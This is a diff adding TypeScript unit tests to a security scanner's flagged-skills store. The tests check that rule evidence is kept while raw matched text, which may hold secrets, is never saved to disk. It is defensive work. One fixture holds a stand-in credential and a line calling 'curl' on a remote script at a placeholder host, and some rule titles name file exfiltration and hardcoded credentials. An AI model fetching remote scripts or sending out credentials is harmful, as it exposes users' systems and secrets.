@@ -136,3 +136,204 @@ describe('flagged-skills store', () => {
     expect(readFileSync(flaggedSkillsPath(d), 'utf-8')).toBe('{ not json'); // never clobbered on read
   });
 });
+
+/**
+ * Evidence layer: WHY a skill was flagged, not just THAT it was.
+ *
+ * Before this, the store kept only `riskLevel`, so `pga status` could report a
+ * CRITICAL skill but could not say which rule fired or where — leaving the user
+ * with blind obedience or a manual re-audit of every flagged skill. The scan
+ * already computes rule id / title / severity / location; it was being dropped
+ * on the way to disk.
+ */
+describe('flagged-skills evidence', () => {
+  it('persists which rule fired and where, alongside the verdict', () => {
+    const d = sandbox();
+    recordScanResults({
+      dataDir: d,
+      scannedNames: ['repo-helper'],
+      flagged: [
+        {
+          name: 'repo-helper',
+          platform: 'claude-code',
+          riskLevel: 'CRITICAL',
+          evidence: [
+            {
+              ruleId: 'ATR-2026-00162',
+              title: 'Outbound copy of local files in skill instructions',
+              severity: 'critical',
+            },
+          ],
+        },
+      ],
+      scannedAt: '2026-07-19T00:00:00.000Z',
+    });
+    const [skill] = readFlaggedSkills(d);
+    expect(skill?.evidence).toEqual([
+      {
+        ruleId: 'ATR-2026-00162',
+        title: 'Outbound copy of local files in skill instructions',
+        severity: 'critical',
+      },
+    ]);
+  });
+
+  it('NEVER writes a matched snippet to disk (secret discipline)', () => {
+    const d = sandbox();
+    // A snippet is the raw matched source line. When the rule that matched is a
+    // secret-detection rule, that line IS the secret — and this store lives on
+    // disk indefinitely. The marker below stands in for such a line.
+    const RAW_MATCHED_LINE = 'MATCHED-SOURCE-LINE-MUST-NOT-BE-PERSISTED';
+    recordScanResults({
+      dataDir: d,
+      scannedNames: ['leaky'],
+      flagged: [
+        {
+          name: 'leaky',
+          platform: 'claude-code',
+          riskLevel: 'CRITICAL',
+          evidence: [
+            {
+              ruleId: 'ATR-2026-00113',
+              title: 'Hardcoded credential',
+              severity: 'critical',
+              location: 'SKILL.md:3',
+              snippet: RAW_MATCHED_LINE,
+            } as never,
+          ],
+        },
+      ],
+      scannedAt: '2026-07-19T00:00:00.000Z',
+    });
+    const raw = readFileSync(flaggedSkillsPath(d), 'utf-8');
+    expect(raw).not.toContain(RAW_MATCHED_LINE);
+    expect(raw).not.toContain('snippet');
+    const [skill] = readFlaggedSkills(d);
+    expect(skill?.evidence?.[0]).not.toHaveProperty('snippet');
+    expect(skill?.evidence?.[0]?.ruleId).toBe('ATR-2026-00113');
+  });
+
+  it('caps stored evidence so one noisy skill cannot bloat the store', () => {
+    const d = sandbox();
+    recordScanResults({
+      dataDir: d,
+      scannedNames: ['noisy'],
+      flagged: [
+        {
+          name: 'noisy',
+          platform: 'claude-code',
+          riskLevel: 'HIGH',
+          evidence: Array.from({ length: 40 }, (_, i) => ({
+            ruleId: `ATR-2026-${String(i).padStart(5, '0')}`,
+            title: `finding ${i}`,
+            severity: 'high',
+          })),
+        },
+      ],
+      scannedAt: '2026-07-19T00:00:00.000Z',
+    });
+    const [skill] = readFlaggedSkills(d);
+    expect(skill?.evidence?.length).toBeLessThanOrEqual(5);
+    // Keeps the FIRST findings (the auditor orders by severity).
+    expect(skill?.evidence?.[0]?.ruleId).toBe('ATR-2026-00000');
+  });
+
+  it('reads a pre-evidence store written by an older version', () => {
+    const d = sandbox();
+    writeFileSync(
+      flaggedSkillsPath(d),
+      JSON.stringify({
+        lastScanAt: '2026-07-01T00:00:00.000Z',
+        flagged: [
+          {
+            name: 'old',
+            normalizedName: 'old',
+            platform: 'claude-code',
+            riskLevel: 'CRITICAL',
+            scannedAt: '2026-07-01T00:00:00.000Z',
+          },
+        ],
+      }),
+      'utf-8'
+    );
+    const [skill] = readFlaggedSkills(d);
+    expect(skill?.name).toBe('old');
+    expect(skill?.evidence).toBeUndefined();
+  });
+
+  it('drops evidence when a re-scan clears the skill', () => {
+    const d = sandbox();
+    recordScanResults({
+      dataDir: d,
+      scannedNames: ['repo-helper'],
+      flagged: [
+        {
+          name: 'repo-helper',
+          platform: 'claude-code',
+          riskLevel: 'CRITICAL',
+          evidence: [{ ruleId: 'ATR-2026-00162', title: 'x', severity: 'critical' }],
+        },
+      ],
+      scannedAt: '2026-07-19T00:00:00.000Z',
+    });
+    recordScanResults({
+      dataDir: d,
+      scannedNames: ['repo-helper'],
+      flagged: [],
+      scannedAt: '2026-07-19T01:00:00.000Z',
+    });
+    expect(readFlaggedSkills(d)).toHaveLength(0);
+  });
+
+  it('drops `location`, which for ATR findings carries the matched text', () => {
+    const d = sandbox();
+    // ATR reports location as "Matched: <raw text that tripped the rule>", so a
+    // credential rule hands over the credential. The live `--verbose` view may
+    // show a user their own file; this long-lived store must not keep it.
+    const MATCHED_TEXT = `Matched: AKIA${'A'.repeat(16)}, curl http://x.example/a.sh`;
+    recordScanResults({
+      dataDir: d,
+      scannedNames: ['leaky'],
+      flagged: [
+        {
+          name: 'leaky',
+          platform: 'claude-code',
+          riskLevel: 'CRITICAL',
+          evidence: [
+            {
+              ruleId: 'ATR-2026-00113',
+              title: 'Hardcoded credential',
+              severity: 'critical',
+              location: MATCHED_TEXT,
+            } as never,
+          ],
+        },
+      ],
+      scannedAt: '2026-07-19T00:00:00.000Z',
+    });
+    const raw = readFileSync(flaggedSkillsPath(d), 'utf-8');
+    expect(raw).not.toContain(`AKIA${'A'.repeat(16)}`);
+    expect(raw).not.toContain('location');
+    // Still enough to triage: the rule id survives, and it is public YAML.
+    expect(readFlaggedSkills(d)[0]?.evidence?.[0]?.ruleId).toBe('ATR-2026-00113');
+  });
+
+  it('discards malformed evidence rather than failing the scan', () => {
+    const d = sandbox();
+    recordScanResults({
+      dataDir: d,
+      scannedNames: ['weird'],
+      flagged: [
+        {
+          name: 'weird',
+          platform: 'claude-code',
+          riskLevel: 'HIGH',
+          evidence: [null, 42, { title: 'kept', severity: 'high' }, { severity: 'high' }] as never,
+        },
+      ],
+      scannedAt: '2026-07-19T00:00:00.000Z',
+    });
+    const [skill] = readFlaggedSkills(d);
+    expect(skill?.evidence).toEqual([{ title: 'kept', severity: 'high' }]);
+  });
+});
